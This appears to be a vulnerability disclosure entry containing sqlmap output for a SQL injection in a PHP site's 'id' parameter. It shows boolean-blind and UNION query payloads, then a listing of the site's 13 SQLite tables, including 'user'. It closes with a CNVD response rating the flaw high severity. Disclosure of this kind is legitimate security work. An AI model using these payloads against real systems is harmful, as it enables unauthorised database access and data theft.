Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: action=show&id=1195' AND 6272=6272 AND 'XrPi'='XrPi    Type: UNION query    Title: Generic UNION query (NULL) - 15 columns    Payload: action=show&id=-1979' UNION ALL SELECT NULL,NULL,'qcvmq'||'TyNVquwsdq'||'qfmfq',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[17:24:55] [INFO] the back-end DBMS is SQLiteweb application technology: PHP 5.3.23, Nginxback-end DBMS: SQLite[17:24:55] [INFO] fetching tables for database: 'SQLite_masterdb'[17:24:55] [INFO] the SQL query used returns 13 entries[17:24:55] [INFO] retrieved: "jbinfo"[17:24:55] [INFO] retrieved: "guest"[17:24:55] [INFO] retrieved: "t_protype"[17:24:55] [INFO] retrieved: "order_num"[17:24:55] [INFO] retrieved: "x_order"[17:24:56] [INFO] retrieved: "house_type"[17:24:56] [INFO] retrieved: "global_set"[17:24:56] [INFO] retrieved: "article_type"[17:24:56] [INFO] retrieved: "js_infos"[17:24:56] [INFO] retrieved: "vote_choice"[17:24:56] [INFO] retrieved: "vote_title"[17:24:56] [INFO] retrieved: "article"[17:24:57] [INFO] retrieved: "user"Database: SQLite_masterdb[13 tables]+--------------+| article      || article_type || global_set   || guest        || house_type   || jbinfo       || js_infos     || order_num    || t_protype    || user         || vote_choice  || vote_title   || x_order      |+--------------+

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-07-25 22:17 厂商回复： CNVD确认所述案例，未确认为通用软件漏洞，疑为定制系统，已经转由CNCERT下发给对应的分中心处置。 最新状态： 暂无
